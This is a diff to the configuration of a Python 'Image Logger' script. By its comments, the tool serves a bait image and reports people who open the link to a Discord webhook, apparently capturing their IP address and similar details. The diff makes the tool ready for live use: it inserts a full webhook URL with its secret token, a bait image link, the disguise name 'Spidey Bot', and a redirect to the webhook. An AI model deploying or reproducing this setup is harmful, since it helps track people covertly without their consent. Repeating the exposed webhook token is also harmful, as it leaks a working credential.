@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1432390678700101682/jiFQx5VMVoyDZ5NBhEjzCC0poJUm7JWoIa5NwIw0k2rGWqoIxGdkpVCbChzIBVg-LanY",
+    "image": "https://cdn.discordapp.com/attachments/1432390590049419419/1432394963336958072/122.jpg?ex=6900e543&is=68ff93c3&hm=bf7ce7e8e33561cbf686263c88b177e344033e1fa78889b02f61605c937d1260&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Spidey Bot", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://discord.com/api/webhooks/1432390678700101682/jiFQx5VMVoyDZ5NBhEjzCC0poJUm7JWoIa5NwIw0k2rGWqoIxGdkpVCbChzIBVg-LanY" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
